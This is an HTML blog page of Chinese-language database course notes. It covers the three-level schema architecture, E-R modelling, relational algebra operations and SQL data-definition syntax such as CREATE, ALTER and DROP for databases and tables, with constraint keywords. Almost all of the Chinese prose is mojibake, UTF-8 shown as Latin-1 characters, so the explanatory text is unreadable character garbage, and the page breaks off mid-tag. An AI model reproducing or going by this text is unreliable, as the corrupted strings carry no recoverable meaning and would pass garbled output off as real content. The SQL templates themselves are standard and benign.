title="1.1æ•°æ®åº“ç®¡ç†æŠ€æœ¯çš„å‘å±•"></a>1.1æ•°æ®åº“ç®¡ç†æŠ€æœ¯çš„å‘å±•</h3><p>1.æ•°æ®çš„å«ä¹‰ç§°ä¸ºæ•°æ®çš„è¯­ä¹‰ã€‚ä¾‹ï¼š93æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¯­ä¹‰1ï¼šå­¦ç”ŸæŸè¯¾æˆç»©ã€‚è¯­ä¹‰2ï¼šæŸäººçš„ä½“é‡ã€‚<br>2.æ•°æ®ç®¡ç†æ—¶æ•°æ®å¤„ç†çš„æ ¸å¿ƒã€‚</p><h3 id="1-2ç†è§£æ•°æ®åº“ç³»ç»Ÿ"><a href="#1-2ç†è§£æ•°æ®åº“ç³»ç»Ÿ" class="headerlink" title="1.2ç†è§£æ•°æ®åº“ç³»ç»Ÿ"></a>1.2ç†è§£æ•°æ®åº“ç³»ç»Ÿ</h3><p>3.æ•°æ®åº“(DB)æ˜¯é•¿æœŸå‚¨å­˜åœ¨è®¡ç®—æœºå†…ã€æœ‰ç»„ç»‡çš„ã€å¯å…±äº«çš„å¤§é‡æ•°æ®é›†åˆã€‚<br>4.æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ(DBMS) æ˜¯ä½äºç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„ä¸€å±‚æ•°æ®ç®¡ç†è½¯ä»¶ã€‚ä¾‹å¦‚Mysql,Mssql,Oracleç­‰ã€‚<br>5.æ•°æ®åº“ç³»ç»Ÿ(DBS) æ˜¯æŒ‡å¸¦æœ‰æ•°æ®åº“å¹¶åˆ©ç”¨æ•°æ®åº“æŠ€æœ¯è¿›è¡Œæ•°æ®ç®¡ç†çš„è®¡ç®—æœºç³»ç»Ÿã€‚</p><h3 id="1-3æ•°æ®åº“ç³»ç»Ÿä½“ç³»ç»“æ„"><a href="#1-3æ•°æ®åº“ç³»ç»Ÿä½“ç³»ç»“æ„" class="headerlink" title="1.3æ•°æ®åº“ç³»ç»Ÿä½“ç³»ç»“æ„"></a>1.3æ•°æ®åº“ç³»ç»Ÿä½“ç³»ç»“æ„</h3><p>1.ä¸‰çº§æ¨¡å¼: å¤–æ¨¡å¼ã€æ¨¡å¼ã€å†…æ¨¡å¼<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011928833.png" style="zoom:50%;" /></p><blockquote><p>a.æ¨¡å¼: </p><p>1.æ•°æ®åº“ä¸­å…¨ä½“æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ã€‚</p><p>2.ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªæ¨¡å¼ã€‚</p></blockquote><blockquote><p>b.å¤–æ¨¡å¼:</p><p>1.æ˜¯æ¨¡å¼å­é›†ã€‚å¤–æ¨¡å¼é¢å‘å…·ä½“åº”ç”¨,æ˜¯æ•°æ®åº“ç”¨æˆ·æ‰€èƒ½ä½¿ç”¨çš„å±€éƒ¨æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ã€‚</p><p>2.ä¸€ä¸ªæ•°æ®åº“å¯ä»¥æœ‰å¤šä¸ªå¤–æ¨¡å¼</p></blockquote><blockquote><p>c.å†…æ¨¡å¼(å­˜å‚¨æ¨¡å¼)</p><p>1.æ˜¯æ•°æ®åº“çš„ç‰©ç†ç»“æ„ã€‚</p><p>2.ä¸€ä¸ªæ•°æ®åº“åªæœ‰ä¸€ä¸ªå†…æ¨¡å¼ã€‚</p></blockquote><p>2.æ•°æ®åº“ç³»ç»Ÿçš„äºŒçº§æ˜ åƒ:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011932692.png" style="zoom: 50%;" /><blockquote><p>å¤–æ¨¡å¼&#x2F;æ¨¡å¼æ˜ åƒ:</p><p>1.å®šä¹‰äº†å¤–æ¨¡å¼ä¸æ¨¡å¼çš„å¯¹åº”å…³ç³»ã€‚</p><p>2.å¤–æ¨¡å¼&#x2F;æ¨¡å¼æ˜ åƒä¿è¯äº†æ•°æ®çš„é€»è¾‘ç‹¬ç«‹æ€§ã€‚</p></blockquote><blockquote><p>æ¨¡å¼&#x2F;å†…æ¨¡å¼æ˜ åƒ:</p><p>1.å®šä¹‰äº†æ•°æ®åº“å…¨å±€é€»è¾‘ç»“æ„ä¸å­˜å‚¨ç»“æ„ä¹‹é—´çš„å¯¹åº”å…³ç³»ã€‚</p><p>2.æ¨¡å¼&#x2F;å†…æ¨¡å¼æ˜ åƒä¿è¯äº†æ•°æ®åº“çš„ç‰©ç†ç‹¬ç«‹æ€§ã€‚</p></blockquote><h3 id="1-4æ•°æ®æ¨¡å‹"><a href="#1-4æ•°æ®æ¨¡å‹" class="headerlink" title="1.4æ•°æ®æ¨¡å‹"></a>1.4æ•°æ®æ¨¡å‹</h3><p>1.æ¨¡å‹æ˜¯ç°å®ä¸–ç•Œç‰¹å¾çš„æ¨¡æ‹Ÿä¸æŠ½è±¡ã€‚<br>2.æ•°æ®æ¨¡å‹çš„å±‚æ¬¡: æ¦‚å¿µæ•°æ®æ¨¡å‹-&gt;é€»è¾‘æ•°æ®æ¨¡å‹-&gt;ç‰©ç†æ•°æ®æ¨¡å‹<br>3.ä¸¤æ­¥æŠ½è±¡: 1.ç°å®ä¸–ç•Œä¸­çš„å®¢è§‚å¯¹è±¡æŠ½è±¡ä¸ºæ¦‚å¿µæ¨¡å‹ 2.æŠŠæ¦‚å¿µæ¨¡å‹è½¬æ¢ä¸ºæŸä¸€DBMSæ”¯æŒçš„æ•°æ®æ¨¡å‹ã€‚</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011936122.png" style="zoom:50%;" /><p>æ¦‚å¿µæ¨¡å‹çš„è¡¨ç¤ºæ–¹æ³•(é‡ç‚¹!)<br>å®ä½“-è”ç³»æ–¹æ³•(E-Ræ–¹æ³•)<br>1.E-Rä¸‰è¦ç´ : å®ä½“ã€å±æ€§ã€è”ç³»<br>2.E-Rå›¾</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011939252.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011940748.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011940807.png" style="zoom:50%;" /><p>å‡ ç§è”ç³»çš„ç”»æ³•å‚è€ƒä¹¦æˆ–è¯¾ä»¶!</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011941939.png" style="zoom:50%;" /><p>E-Rå›¾ä¾‹é¢˜:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011942233.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011942584.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011942160.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011943869.png" style="zoom:50%;" /><p>é€»è¾‘æ•°æ®æ¨¡å‹ä¸‰è¦ç´ : 1.æ•°æ®ç»“æ„ 2.æ•°æ®æ“ä½œ 3.æ•°æ®çš„çº¦æŸæ¡ä»¶<br>é€»è¾‘æ•°æ®æ¨¡å‹çš„ç±»åˆ«: 1.æ ¼å¼åŒ–æ¨¡å‹ 2.å…³ç³»æ¨¡å‹ 3.é¢å‘å¯¹è±¡æ¨¡å‹ 4.å¯¹è±¡å…³ç³»æ¨¡å‹</p><h2 id="2-å…³ç³»æ•°æ®æ¨¡å‹"><a href="#2-å…³ç³»æ•°æ®æ¨¡å‹" class="headerlink" title="2.å…³ç³»æ•°æ®æ¨¡å‹"></a>2.å…³ç³»æ•°æ®æ¨¡å‹</h2><h3 id="2-1å…³ç³»æ•°æ®ç»“æ„"><a href="#2-1å…³ç³»æ•°æ®ç»“æ„" class="headerlink" title="2.1å…³ç³»æ•°æ®ç»“æ„"></a>2.1å…³ç³»æ•°æ®ç»“æ„</h3><p>1.ä¸€ä¸ªå…³ç³»å°±æ˜¯ä¸€ä¸ªè§„èŒƒåŒ–çš„äºŒç»´è¡¨ã€‚è§„èŒƒåŒ–æ˜¯æŒ‡è¡¨ä¸­æ¯åˆ—éƒ½æ˜¯åŸå­é¡¹,å³æ²¡æœ‰è¡¨ä¸­è¡¨ã€‚<br>ä¸€ä¸ªå…³ç³»ç”±å…³ç³»å(è¡¨å)ã€å…³ç³»æ¨¡å¼(è¡¨å¤´)å’Œå…³ç³»å®ä¾‹(æ•°æ®)ç»„æˆã€‚<br>2.äºŒç»´è¡¨åŸºæœ¬æœ¯è¯­:</p><ol><li>å…³ç³»: äºŒç»´è¡¨</li><li>å…ƒç¥–: äºŒç»´è¡¨ä¸­çš„ä¸€è¡Œå³ä¸ºä¸€ä¸ªå…ƒç¥–</li><li>å±æ€§: äºŒç»´è¡¨ä¸­çš„ä¸€åˆ—å³ä¸ºä¸€ä¸ªå±æ€§</li><li>ç : è¡¨ä¸­å¯å”¯ä¸€ç¡®å®šå…ƒç¥–çš„å•ä¸ªå±æ€§æˆ–å±æ€§ç»„</li><li>åŸŸ: å±æ€§çš„å–å€¼èŒƒå›´</li><li>åˆ†é‡: å…ƒç»„ä¸­çš„ä¸€ä¸ªå±æ€§å€¼</li><li>å…³ç³»æ¨¡å¼: å¯¹å…³ç³»â€å‹â€æè¿° ã€‚é€šå¸¸è¡¨ç¤ºä¸º: å…³ç³»å(å±æ€§1,å±æ€§2,â€¦,å±æ€§n)</li></ol><p>3.ç¬›å¡å°”ç§¯</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011956925.png" style="zoom:50%;" /><p>ä¾‹å¦‚:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011959326.png" style="zoom:50%;" /><p>å…ƒç¥–: ç¬›å¡å°”ç§¯ä¸­æ¯ä¸€ä¸ªå…ƒç´ äº¤nå…ƒç¥–æˆ–å…ƒç¥–<br>åˆ†é‡: ç¬›å¡å°”ç§¯å…ƒç¥–(d1,d2,â€¦,dn) ä¸­çš„æ¯ä¸€ä¸ªå€¼di å«åšä¸€ä¸ªåˆ†é‡<br>åŸºæ•°: æ¯ä¸ªåŸŸä¸­å…ƒç´ çš„æ•°é‡çš„ä¹˜ç§¯ã€‚å¦‚ä¸Šä¾‹ä¸­ï¼Œå³ä¸º2x2x3<br>ç¬›å¡å°”ç§¯è¡¨ç¤ºæ–¹æ³•:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012003776.png" style="zoom: 50%;" /><p>4.å…³ç³»:</p><ol><li><p>D1xD2xâ€¦xDnçš„å­é›†æˆä¸ºåœ¨åŸŸD1,D2,â€¦,Dnä¸Šçš„å…³ç³»,è¡¨ç¤ºä¸º R (D1,D2,â€¦,Dn)ã€‚Rä¸ºå…³ç³»å, n:å…³ç³»çš„ç›®æˆ–åº¦ã€‚</p></li><li><p>å…³ç³»ä¸­çš„æ¯ä¸ªå…ƒç´ æ˜¯å…³ç³»ä¸­çš„å…ƒç¥–,é€šå¸¸ç”¨tè¡¨ç¤ºã€‚<br>5.å…³ç³»æ¨¡å¼</p><ol><li>å®šä¹‰é€šå¸¸ç®€è®°ä¸ºR(U) æˆ–R(A1,A2,â€¦,An)</li><li>å…³ç³»æ¨¡å¼æ˜¯å‹, å…³ç³»å¼å€¼</li></ol></li></ol><p>6.å…³ç³»æ•°æ®åº“:</p><pre><code>1. åœ¨ä¸€ä¸ªç»™å®šçš„åº”ç”¨é¢†åŸŸä¸­,æ‰€æœ‰å®ä½“åŠå®ä½“ä¹‹é—´è”ç³»çš„å…³ç³»çš„é›†åˆæ„æˆä¸€ä¸ªå…³ç³»æ•°æ®åº“ã€‚1. å…³ç³»æ•°æ®åº“çš„å‹ç§°ä¸ºå…³ç³»æ•°æ®åº“æ¨¡å¼ã€‚å…³ç³»æ•°æ®åº“çš„å€¼ç§°ä¸ºå…³ç³»æ•°æ®åº“ã€‚1. å…³ç³»å…ƒç¥–ä¸­å…è®¸å‡ºç°ç©ºå€¼ã€‚ç©ºç½®ä»£è¡¨æœªçŸ¥çš„å€¼æˆ–ä¸å­˜åœ¨çš„å€¼ã€‚ä¸€èˆ¬ç”¨å…³é”®è¯NULLè¡¨ç¤ºã€‚</code></pre><p>7.ç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012018972.png" style="zoom:50%;" /></p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012023942.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012023027.png" style="zoom:50%;" /><p>å…·ä½“å†…å®¹å‚ç…§æ•™ææˆ–è¯¾ç¨‹ppt!</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012017070.png" style="zoom:50%;" /><h3 id="2-2å…³ç³»æ“ä½œ"><a href="#2-2å…³ç³»æ“ä½œ" class="headerlink" title="2.2å…³ç³»æ“ä½œ"></a>2.2å…³ç³»æ“ä½œ</h3><p>1.å…³ç³»ä»£æ•°: å°†å…³ç³»çœ‹æˆå…ƒç¥–çš„é›†åˆ,è¿ç®—ä»å…³ç³»çš„â€æ°´å¹³â€æ–¹å‘å³è¡Œçš„è§’åº¦æ¥è¿›è¡Œ<br>2.è¡¨ç¤ºè®°å·</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012044374.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012045249.png" style="zoom:50%;" /><p>3.å…³ç³»æ“ä½œå®ä¾‹:<br>å¹¶, æå–å‡ºRå’ŒSå„è‡ªçš„å…ƒç¥–,å»é‡åç»„åˆåœ¨ä¸€èµ·</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012045918.png" style="zoom:50%;" /><p>å·®  R-S&#x3D;Rå‡å»Rå’ŒSå…±æœ‰çš„éƒ¨åˆ†<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012047817.png" style="zoom:50%;" /></p><p>äº¤ Rå’ŒSå…±æœ‰çš„éƒ¨åˆ†<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012047723.png" style="zoom:50%;" /></p><p>ç¬›å¡å°”ç§¯<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012049034.png" style="zoom:50%;" /></p><p>4.ä¸“é—¨çš„è¿ç®—ç¬¦!</p><p>â€‹1.é€‰æ‹©: ä»è¡Œçš„è§’åº¦è¿›è¡Œè¿ç®—:<br>â€‹<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012051934.png" style="zoom:50%;" /></p><p>â€‹2.æŠ•å½±: ä»åˆ—çš„è§’åº¦è¿›è¡Œè¿ç®—:<br>â€‹<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012052241.png" style="zoom:50%;" /></p><p>â€‹<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012053932.png" style="zoom:50%;" /></p><p>â€‹3.è¿æ¥: ä»Rå’ŒSçš„å¹¿ä¹‰ç¬›å¡å°”ç§¯RXSä¸­é€‰å–æ»¡è¶³ç»™å®šå…³ç³»çš„å…ƒç¥–<br>â€‹1.ä¸€èˆ¬è¿æ¥<br>â€‹<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012054264.png" style="zoom:50%;" /></p><p>â€‹2.ç­‰å€¼è¿æ¥:<br>â€‹<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012055490.png" style="zoom:50%;" /></p><p>â€‹3.è‡ªç„¶è¿æ¥: å’Œå‰ä¸¤è€…ç›¸æ¯”,éœ€è¦å–æ¶ˆé‡å¤åˆ—<br>â€‹<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012057007.png" style="zoom:50%;" /></p><p>â€‹4.å¤–è¿æ¥: å·¦å¤–è¿æ¥,åˆå¤–è¿æ¥,å¤–è¿æ¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012058088.png" style="zoom:50%;" /></p><p>â€‹å·¦å¤–è¿æ¥ä»¥å·¦è¾¹Rä¸ºä¸»,ç»“æœä¸­åŒ…å«å·¦è¡¨ä¸­å…¨éƒ¨çš„è¡Œ,ä»¥åŠå³è¡¨ä¸­æ‰€æœ‰åŒ¹é…çš„è¡Œã€‚å³å¤–è¿æ¥ç›¸åã€‚<br>â€‹å…¨å¤–è¿æ¥ï¼šè‡ªç„¶è¿æ¥ä¸­æŠŠèˆå¼ƒçš„å…ƒç¥–éƒ½ä¿å­˜åœ¨ç»“æœä¸­ï¼Œè€Œåœ¨å…¶ä»–å±æ€§ä¸Šå¡«ç©ºå€¼(NULL)</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012100012.png" style="zoom:50%;" /><p>â€‹5.é™¤<br>â€‹åƒæ:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012103740.png" style="zoom:50%;" /><br>â€‹é™¤æ³•:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012104072.png" style="zoom:50%;" /></p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012105660.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012105920.png" style="zoom:50%;" /><h2 id="3-å…³ç³»æ•°æ®åº“è¯­è¨€SQL"><a href="#3-å…³ç³»æ•°æ®åº“è¯­è¨€SQL" class="headerlink" title="3.å…³ç³»æ•°æ®åº“è¯­è¨€SQL"></a>3.å…³ç³»æ•°æ®åº“è¯­è¨€SQL</h2><h3 id="3-1-SQLæ¦‚è¿°"><a href="#3-1-SQLæ¦‚è¿°" class="headerlink" title="3.1 SQLæ¦‚è¿°"></a>3.1 SQLæ¦‚è¿°</h3><p>1.SQLç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€æ˜¯å…³ç³»æ•°æ®åº“çš„æ ‡å‡†è¯­è¨€ã€‚<br>2.SQLç‰¹ç‚¹: ç»¼åˆç»Ÿä¸€ã€é«˜åº¦éè¿‡ç¨‹åŒ–ã€é¢å‘é›†åˆçš„æ“ä½œæ–¹å¼ã€ä»¥åŒä¸€ç§è¯­æ³•ç»“æ„æä¾›ä¸¤ç§ä½¿ç”¨æ–¹æ³•ã€è¯­è¨€ç®€æ´æ˜“å­¦æ˜“ç”¨ã€‚<br>3.åŸºæœ¬è¡¨ï¼šç‹¬ç«‹å­˜åœ¨äºæ•°æ®åº“ä¸­çš„è¡¨ï¼Œæ˜¯â€œå®è¡¨â€<br>4.è§†å›¾æ˜¯ä»ä¸€ä¸ªæˆ–å‡ ä¸ªåŸºæœ¬è¡¨å¯¼å‡ºçš„è¡¨ï¼Œæ˜¯â€œè™šè¡¨â€ã€‚å®ƒæœ¬èº«ä¸å­˜åœ¨ä¸æ•°æ®åº“ä¸­ï¼Œæ•°æ®åº“ä¸­åªå­˜æ”¾è§†å›¾çš„å®šä¹‰ï¼Œè€Œä¸å­˜æ”¾è§†å›¾å¯¹åº”çš„æ•°æ®ï¼Œè¿™äº›æ•°æ®ä»å­˜æ”¾åœ¨å¯¼å‡ºè§†å›¾çš„åŸºæœ¬è¡¨ä¸­ã€‚å½“åŸºæœ¬è¡¨ä¸­æ•°æ®å˜åŒ–æ—¶ï¼Œè§†å›¾ä¸­æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ä¹Ÿéšä¹‹æ”¹å˜ã€‚<br>5.æ•°æ®åº“æ˜¯é€»è¾‘çš„ï¼Œå­˜å‚¨æ–‡ä»¶æ—¶ç‰©ç†çš„ã€‚æ•°æ®åº“çš„æ‰€æœ‰ä¿¡æ¯éƒ½ä¿å­˜åœ¨å­˜å‚¨æ–‡ä»¶ä¸­ã€‚<br>6.ç´¢å¼•ï¼šç´¢å¼•æ˜¯æ ¹æ®ç´¢å¼•è¡¨è¾¾å¼çš„å€¼è¿›è¡Œé€»è¾‘æ’åºçš„ä¸€ç»„æŒ‡é’ˆï¼Œå¯ä»¥å®ç°å¯¹æ•°æ®çš„å¿«é€Ÿè®¿é—®ã€‚æ˜¯å…³ç³»æ•°æ®åº“çš„å†…éƒ¨å®ç°æŠ€æœ¯ï¼Œå±äºå†…æ¨¡å¼ï¼Œè¢«å­˜æ”¾åœ¨å­˜å‚¨æ–‡ä»¶ä¸­ã€‚</p><h3 id="3-2-SQLè¯­è¨€çš„æ•°æ®ç±»å‹"><a href="#3-2-SQLè¯­è¨€çš„æ•°æ®ç±»å‹" class="headerlink" title="3.2 SQLè¯­è¨€çš„æ•°æ®ç±»å‹"></a>3.2 SQLè¯­è¨€çš„æ•°æ®ç±»å‹</h3><p>1.æ•°å€¼å‹ï¼šåŒ…æ‹¬æ•´å½¢(bigintã€intã€smallintã€tinyintã€bit)ã€å®šç‚¹å®æ•°(numericã€decimal)ã€æµ®ç‚¹æ•°(floatã€real)ã€‚<br>2.å­—ç¬¦å‹: åŒ…æ‹¬å®šé•¿å­—ç¬¦ä¸²charå’Œå˜é•¿å­—ç¬¦ä¸²varcharã€‚<br>3.Unicodeå­—ç¬¦å‹: åŒ…æ‹¬nchar[(n)]å’Œnvarchar[(n)]ä¸¤ç±»ã€‚<br>4.æ–‡æœ¬å‹: åŒ…æ‹¬textå’Œntextä¸¤ç±»ã€‚<br>5.æ—¥æœŸæ—¶é—´ç±»å‹: åŒ…æ‹¬datetimeå’Œsmalldatetimeä¸¤ç±»ã€‚ç”¨æˆ·ä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å…¥æ—¥æœŸæ—¶é—´ç±»å‹æ•°æ®ï¼Œç³»ç»Ÿä¹Ÿä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºæ—¥æœŸæ—¶é—´ç±»å‹æ•°æ®ã€‚<br>ä¾‹å¦‚: 2009-10-10 7:18:18 PM &#x2F;*12å°æ—¶æ ¼å¼*&#x2F;<br>2009-10-10 19:18:18 &#x2F;*24å°æ—¶æ ¼å¼*&#x2F;<br>6.äºŒè¿›åˆ¶æ•°æ®ç±»å‹è¡¨ç¤ºä¸ºä½æ•°æ®æµã€‚</p><h3 id="3-3-æ•°æ®å®šä¹‰"><a href="#3-3-æ•°æ®å®šä¹‰" class="headerlink" title="3.3 æ•°æ®å®šä¹‰"></a>3.3 æ•°æ®å®šä¹‰</h3><p>åœ¨å­¦ä¹ å‰ï¼Œå…ˆæŠŠç¯å¢ƒæ­ä¸€ä¸‹ã€‚<br>å‚è€ƒæ–‡ç« <a href="https://blog.csdn.net/weixin_46081857/article/details/128127425">https://blog.csdn.net/weixin_46081857&#x2F;article&#x2F;details&#x2F;128127425</a></p><h4 id="3-3-1-æ¨¡å¼å®šä¹‰"><a href="#3-3-1-æ¨¡å¼å®šä¹‰" class="headerlink" title="3.3.1 æ¨¡å¼å®šä¹‰"></a>3.3.1 æ¨¡å¼å®šä¹‰</h4><p>1.å®šä¹‰æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE <span class="operator">&lt;</span>æ•°æ®åº“å<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>2.ä½¿ç”¨æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">USE <span class="operator">&lt;</span>æ•°æ®åº“å<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>3.ä¿®æ”¹æ•°æ®åº“</p><p>è¯¥è¯­å¥å¯ä»¥å¯¹æŒ‡å®šçš„æ•°æ®åº“çš„æ•°æ®æ–‡ä»¶å’Œæ—¥å¿—æ–‡ä»¶ç­‰è¿›è¡Œä¿®æ”¹</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> DATABASE <span class="operator">&lt;</span>æ•°æ®åº“å<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>4.åˆ é™¤æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE <span class="operator">&lt;</span>æ•°æ®åº“å<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-3-2åŸºæœ¬è¡¨å®šä¹‰"><a href="#3-3-2åŸºæœ¬è¡¨å®šä¹‰" class="headerlink" title="3.3.2åŸºæœ¬è¡¨å®šä¹‰"></a>3.3.2åŸºæœ¬è¡¨å®šä¹‰</h4><p>1.å®šä¹‰åŸºæœ¬è¡¨</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="operator">&lt;</span>åŸºæœ¬è¡¨å<span class="operator">&gt;</span> </span><br><span class="line">( <span class="operator">&lt;</span>åˆ—å<span class="operator">&gt;</span> <span class="operator">&lt;</span>æ•°æ®ç±»å‹<span class="operator">&gt;</span> [<span class="operator">&lt;</span>åˆ—çº§å®Œæ•´æ€§çº¦æŸæ¡ä»¶<span class="operator">&gt;</span>]</span><br><span class="line"> &#123;,<span class="operator">&lt;</span>åˆ—å<span class="operator">&gt;</span> <span class="operator">&lt;</span>æ•°æ®ç±»å‹<span class="operator">&gt;</span> [<span class="operator">&lt;</span>åˆ—çº§å®Œæ•´æ€§çº¦æŸæ¡ä»¶<span class="operator">&gt;</span>]&#125; ...</span><br><span class="line"> [,è¡¨çº§å®Œæ•´æ€§çº¦æŸæ¡ä»¶]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>åˆ—çº§å®Œæ•´æ€§çº¦æŸ,ä½œç”¨èŒƒå›´ä»…é™äºè¯¥åˆ—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NOT NULL éçº¦æŸæ§åˆ¶:é™åˆ¶åˆ—å–å€¼ä¸èƒ½ä¸ºç©º</span><br><span class="line">DEFAULT æŒ‡å®šåˆ—çš„é»˜è®¤å€¼</span><br><span class="line">UNIQUE å”¯ä¸€æ€§çº¦æŸ:é™åˆ¶åˆ—çš„å–å€¼ä¸èƒ½é‡å¤</span><br><span class="line">CHECK é™åˆ¶åˆ—çš„å–å€¼èŒƒå›´</span><br><span class="line">PRIMARY KEY ä¸»çº¦æŸ:åˆ¶å®šæœ¬åˆ—ä¸ºä¸»ç </span><br><span class="line">FOREIGN KEY æŒ‡å®šæœ¬åˆ—ä¸ºå¼•ç”¨å…¶ä»–è¡¨çš„å¤–ç  [FOREIGN KEY(&lt;å¤–ç åˆ—å&gt;)] REFERENCE&lt;å¤–è¡¨é¢&gt;(&lt;å¤–è¡¨åˆ—å&gt;)</span><br></pre></td></tr></table></figure><p>è¡¨çº§çº¦æŸæ¡ä»¶,è¡¨çº§å®Œæ•´æ€§çº¦æŸçš„ä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ªè¡¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNIQUEã€CHECKã€PRIMARY KEYã€FOREIGN KEYå¯ä»¥ç”¨äºå®šä¹‰è¡¨çº§å®Œæ•´æ€§çº¦æŸ</span><br><span class="line">NOT NULLã€DEFAULTä¸å¯ä»¥</span><br></pre></td></tr></table></figure><p>ä¾‹:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012259333.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012259916.png" style="zoom:50%;" /><p>2.ä¿®æ”¹åŸºæœ¬è¡¨</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="operator">&lt;</span>åŸºæœ¬è¡¨å<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> <span class="operator">&lt;</span>åˆ—å<span class="operator">&gt;</span> <span class="operator">&lt;</span>æ–°æ•°æ®ç±»å‹<span class="operator">&gt;</span> [<span class="keyword">NULL</span><span class="operator">|</span><span class="keyword">NOT</span> <span class="keyword">NULL</span>]  <span class="comment">--ä¿®æ”¹å·²æœ‰åˆ—</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">ADD</span> <span class="operator">&lt;</span>åˆ—å<span class="operator">&gt;</span> <span class="operator">&lt;</span>æ•°æ®ç±»å‹<span class="operator">&gt;</span> [çº¦æŸ] <span class="comment">--å¢åŠ æ–°åˆ—</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> <span class="operator">&lt;</span>åˆ—å<span class="operator">&gt;</span> <span class="comment">--åˆ é™¤åˆ—</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">ADD</span> [<span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>çº¦æŸå<span class="operator">&gt;</span>] <span class="operator">&lt;</span>çº¦æŸå®šä¹‰<span class="operator">&gt;</span> <span class="comment">--æ·»åŠ çº¦æŸ</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>çº¦æŸå<span class="operator">&gt;</span> <span class="comment">--åˆ é™¤çº¦æŸ</span></span><br></pre></td></tr></table></figure><p>ä¾‹:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012304240.png" style="zoom:50%;" /><p>3.åˆ é™¤åŸºæœ¬è¡¨</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span 